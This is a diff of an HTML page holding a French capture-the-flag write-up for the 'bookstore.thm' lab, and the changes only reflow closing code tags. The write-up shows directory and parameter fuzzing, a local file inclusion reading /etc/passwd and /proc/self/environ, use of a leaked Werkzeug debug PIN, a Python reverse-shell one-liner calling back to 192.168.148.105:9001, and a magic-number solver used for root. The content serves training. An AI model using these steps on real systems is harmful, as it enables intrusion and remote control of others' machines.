@@ -142,13 +142,11 @@ async function renderUsers() {
     container.innerHTML = html;
 }
 renderUsers();
-//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
-</code></pre></div></div>
+//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.</code></pre></div></div>
 <p>Intéressant! Le commentaire de fin laisse présager que les versions précédentes de l’api contiennent un paramètre vulnérable à un local file inclusion alors que la nouvelle version est plus sécurisée. Cette information nous seras utile plus tard. </p>
 <p>En attendant explorons le service tournant sur le port 5000 via <code>http://bookstore.thm:5000</code> </p>
 <p>Il s’agit de la page d’accueil de l’api rest foxy. Nous pouvons essayer de lister les dossiers cachés</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">jsx</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-jsx">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm:5000
-</code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">jsx</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-jsx">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm:5000</code></pre></div></div>
 <p>On a le résultat:</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">jsx</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-jsx">===============================================================
 Gobuster v3.8
@@ -169,8 +167,7 @@ Starting gobuster in directory enumeration mode
 /robots.txt           (Status: 200) [Size: 45]
 ===============================================================
 Finished
-===============================================================
-</code></pre></div></div>
+===============================================================</code></pre></div></div>
 <p>En nous rendant sur <code>http://boockstore.thm:5000/console</code> un code secret nous est demandé. Etant donné qu’on n’a pas le code on passé à /api. Il s’agit de la documentation de l’API  v2</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>API Documentation
 Since every good API has a documentation we have one as well!
@@ -186,8 +183,7 @@ The various routes this API currently provides are:
 
 /api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
 
-/api/v2/resources/books?author=J.K. Rowling&amp;published=2003 (Search by a combination of 2 or more parameters)
-</code></pre></div></div>
+/api/v2/resources/books?author=J.K. Rowling&amp;published=2003 (Search by a combination of 2 or more parameters)</code></pre></div></div>
 <p>L’api nous permet d’inclure des paramètres dans la requêtes. Or souvenons nous qu’il nous  a été dis qu’un paramètre de l’ancienne version de l’api est vulnérable à une locale file inclusion. Vu qu’on est sur la version 2, la version non sécurisée devrait être la version1. Essayons de lister les paramètres disponibles via <code>ffuf</code></p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200</span>
 </code></pre></div></div>
@@ -195,8 +191,7 @@ The various routes this API currently provides are:
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>author
 id
 published
-show
-</code></pre></div></div>
+show</code></pre></div></div>
 <p>Le paramètre <code>show</code> semble interessant. Essayons de vérifier si il est vulnérable en lisant le fichier <code>/etc/passwd</code> </p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -227,8 +222,7 @@ dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
 pollinate:x:109:1::/var/cache/pollinate:/bin/false
 sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
-sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
-</code></pre></div></div>
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</code></pre></div></div>
 <p>C’est une pépite on peut lire ce fichier ce qui confirme que ce paramètre est vulnérable à une LFI.</p>
 <h2 id="exploitation-de-la-lfi">Exploitation de la LFI</h2>
 <p>Le paramètre show est vulnérable et permet d’inclure un fichier et de le lire.Mais en essayant de lire le fichier <code>/etc/shadow</code> on obtient une erreur <code>500 filename not defined.</code> Ainsi le serveur filtre les fichiers en se basant sur une blackliste. Essayons de trouver les fichiers autorisés</p>
@@ -264,22 +258,18 @@ sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 /proc/self/cmdline
 /proc/partitions
 /proc/mounts
-/proc/net/tcp
-</code></pre></div></div>
+/proc/net/tcp</code></pre></div></div>
 <p>Cette liste est assez longue mais le fichier qui  à l’air le plus intéressant est le fichier <code>/proc/self/environ</code>. En lisant son contenu on découvre</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>LANG=en_US.UTF-8OLDPWD=/home/sidPWD=/home/sidHOME=/home/sidWERKZEUG_DEBUG_PIN=123-321-135SHELL=/bin/shSHLVL=1LOGNAME=sidPATH=/usr/bin:/bin_=/usr/bin/python3WERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
-</code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>LANG=en_US.UTF-8OLDPWD=/home/sidPWD=/home/sidHOME=/home/sidWERKZEUG_DEBUG_PIN=123-321-135SHELL=/bin/shSHLVL=1LOGNAME=sidPATH=/usr/bin:/bin_=/usr/bin/python3WERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true</code></pre></div></div>
 <p>Le champ contenant le code PIN est interessant car il nous rappelle la page console qui nous demandais un code pin. On peut donc se rendre sur la page et dans le champ PIN entrer</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>123-321-135
-</code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code>123-321-135</code></pre></div></div>
 <p>On a maintenant accès à la console python.</p>
 <h2 id="capture-user-flag">Capture User Flag</h2>
 <p>Une fois l’accès à la console python obtenu on peut y insérer un script de revershell pour obtenir un shell distant. Sur notre machine on lance l’écoute sur le port 9001</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">nc -lvnp 9001</span>
 </code></pre></div></div>
 <p>Et dans la console web on entre</p>
-<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.148.105",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
-</code></pre></div></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.148.105",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")</code></pre></div></div>
 <p>On obtient ainsi un shell distant. Mais ce genre de shell est souvent fragile et peut se cassez en cas de panne réseau . On peut donc l’exploiter pour une connexion ssh sans mot de passe</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ls /home</span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ls /home</span>
@@ -398,8 +388,7 @@ if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
 __stack_chk_fail();
 }
 return;
-}
-</code></pre></div></div>
+}</code></pre></div></div>
 <p>Ce code nous demande un nombre magique et si il est correcte nous donne un accès root. Ce nombre est obtenu en faisant des calcul mais comme je ne suis pas très avancé en C j’ai utilisé un script python trouvé sur Google adapté à la situation. J’ai d’abord copié la fonction dans un fichier challenge.c. Voici le script python</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python">import re
 import sys
@@ -442,15 +431,13 @@ if __name__ == "__main__":
     if len(sys.argv) &lt; 2:
         print("Usage: python3 solveur.py &lt;nom_du_fichier.c&gt;")
     else:
-        extraire_et_calculer(sys.argv[1])
-</code></pre></div></div>
+        extraire_et_calculer(sys.argv[1])</code></pre></div></div>
 <p>En utilisant ce script on peut récupérer le nombre magic</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">python</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-python">python3 solveur.py challenge.c
 [*] Analyse de : challenge.c
 [*] Valeur cible identifiée : 0x5dcd21f4
 [-] Résultat Hex : 0x5dcd6d51
-[-] Résultat Décimal : 1573743953
-</code></pre></div></div>
+[-] Résultat Décimal : 1573743953</code></pre></div></div>
 <p>Le nombre magique est donc <code>1573743953</code>. On peut donc l’utiliser sur le système cible pour obtenir un accès root et récupérer le root flag</p>
 <div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">sid@bookstore:~$ ./try-harder </span>
 <span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">What's The Magic Number?!</span>
